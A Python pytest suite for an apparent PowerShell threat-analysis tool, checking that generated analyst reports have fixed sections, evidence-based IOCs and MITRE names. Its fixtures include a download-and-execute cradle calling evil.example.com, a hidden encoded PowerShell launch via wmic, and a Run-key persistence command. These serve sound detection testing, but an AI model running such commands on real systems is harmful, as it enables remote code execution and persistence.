"""Analyst Report · regression suite.

Locks in the deterministic, evidence-anchored report contract:
    * 8 required sections + confidence signals,
    * executive summary explicitly names the verdict band,
    * MITRE IDs are dedup'd and paired with human-readable names,
    * IOCs are extracted only from evidence text (never fabricated),
    * unknowns are enumerated when runtime-dependent intents fire,
    * recommendations are ONLY drawn from the fired-intents catalogue,
    * confidence_signals are investigation-specific and never expose
      engineering QA metrics (test counts / accuracy %).
"""
from __future__ import annotations

import base64

import pytest

from v2.investigation.analyst_report import (
    AnalystReport,
    IOC,
    MITREItem,
    Recommendation,
    generate,
)
from v2.investigation.pipeline import investigate


def _enc(script: str) -> str:
    b = base64.b64encode(script.encode("utf-16-le")).decode()
    return f"powershell.exe -w Hidden -EncodedCommand {b}"


# ── canonical inputs ────────────────────────────────────────────
DOWNLOAD_CRADLE = 'iex (New-Object Net.WebClient).DownloadString("http://evil.example.com/x.ps1")'
BENIGN_HELLO    = 'Write-Host "Hello, world"'
PERSISTENCE_KEY = (
    'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
    '-Name X -Value calc.exe'
)
RUNTIME_DEP     = '[Reflection.Assembly]::Load([Convert]::FromBase64String($enc))'
WMIC_CRADLE     = 'wmic process call create "' + _enc(DOWNLOAD_CRADLE) + '"'


def test_report_has_all_required_sections():
    r = investigate(DOWNLOAD_CRADLE)
    d = r.report.to_dict()
    required = {
        "executive_summary", "observed_behaviors", "intent_narrative",
        "evidence", "mitre", "iocs", "unknowns", "recommendations",
        "confidence_signals", "behavior_graph",
    }
    assert set(d.keys()) == required


def test_executive_summary_names_verdict_band():
    for sample, band_kw in [
        (DOWNLOAD_CRADLE, "MALICIOUS"),
        (BENIGN_HELLO, "benign"),
        (RUNTIME_DEP, "RUNTIME"),
    ]:
        r = investigate(sample)
        assert band_kw in r.report.executive_summary or \
               band_kw.lower() in r.report.executive_summary.lower(), (
            f"executive summary must reference verdict band `{band_kw}`; "
            f"got {r.report.executive_summary!r}"
        )


def test_benign_report_has_no_recommendations():
    r = investigate(BENIGN_HELLO)
    assert r.report.recommendations == []


def test_malicious_report_has_immediate_recommendations():
    r = investigate(DOWNLOAD_CRADLE)
    priorities = {rec.priority for rec in r.report.recommendations}
    assert "immediate" in priorities


def test_report_iocs_come_from_evidence_only():
    """IOCs must come from actual observable strings — never fabricated."""
    r = investigate(DOWNLOAD_CRADLE)
    for ioc in r.report.iocs:
        assert ioc.value in DOWNLOAD_CRADLE or \
               ioc.value in (r.cre.effective_payload if r.cre else "") or \
               any(ioc.value in ev.observation
                    for i in r.intent.intents for ev in i.evidence), (
            f"IOC {ioc.value!r} not traceable to evidence or payload"
        )


def test_report_mitre_ids_have_human_names():
    r = investigate(DOWNLOAD_CRADLE)
    for m in r.report.mitre:
        assert m.name and m.name != m.id, (
            f"MITRE ID {m.id} rendered without a human name"
        )
        assert m.intent, "MITRE item missing source intent"


def test_report_confidence_signals_are_investigation_specific():
    """Analyst-facing signals ONLY — no engineering QA metrics.
    User directive: do not surface 'tests passing' / 'accuracy %' /
    'honesty score' in the analyst-facing confidence signals."""
    r = investigate(DOWNLOAD_CRADLE)
    signals = r.report.confidence_signals
    assert set(signals.keys()) == {
        "confidence", "evidence_strength", "unknowns_present", "reasoning"
    }
    # No engineering QA fields must have leaked.
    forbidden = {"accuracy", "honesty", "tests_passing", "explainability_score"}
    assert not (set(signals.keys()) & forbidden)


def test_report_unknowns_populated_on_runtime_dependent():
    """When a runtime-dependent intent fires, unknowns MUST be non-empty
    — the analyst must always see what the tool honestly does not know."""
    r = investigate(RUNTIME_DEP)
    assert r.report.unknowns, (
        "runtime-dependent inputs must always enumerate unknowns"
    )


def test_report_persistence_recommends_autoruns_check():
    r = investigate(PERSISTENCE_KEY)
    joined = " ".join(rec.action for rec in r.report.recommendations).lower()
    assert "autorun" in joined or "persistence" in joined, (
        f"persistence report must recommend autoruns / persistence review, "
        f"got: {joined!r}"
    )


def test_report_determinism_across_replays():
    r1 = investigate(WMIC_CRADLE)
    r2 = investigate(WMIC_CRADLE)
    assert r1.report.to_dict() == r2.report.to_dict()


def test_report_recommendations_are_all_canonical_type():
    r = investigate(DOWNLOAD_CRADLE)
    for rec in r.report.recommendations:
        assert isinstance(rec, Recommendation)
        assert rec.priority in {"immediate", "short_term", "long_term"}
        assert rec.action and rec.rationale


def test_report_never_mentions_specific_malware_family():
    """Honesty — reports must never speculate a specific malware family
    without evidence (the user directive on Cobalt Strike / Empire etc.)."""
    forbidden = ["cobalt strike", "empire", "sliver", "meterpreter", "apt29",
                 "ransomware family", "credential theft campaign"]
    for sample in (DOWNLOAD_CRADLE, WMIC_CRADLE, PERSISTENCE_KEY):
        r = investigate(sample)
        text = (
            r.report.executive_summary + " "
            + " ".join(b["purpose"] for b in r.report.observed_behaviors)
            + " " + " ".join(u for u in r.report.unknowns)
            + " " + " ".join(rec.action + " " + rec.rationale
                             for rec in r.report.recommendations)
        ).lower()
        for word in forbidden:
            assert word not in text, (
                f"report leaked forbidden phrase `{word}` on sample: {sample[:60]}"
            )
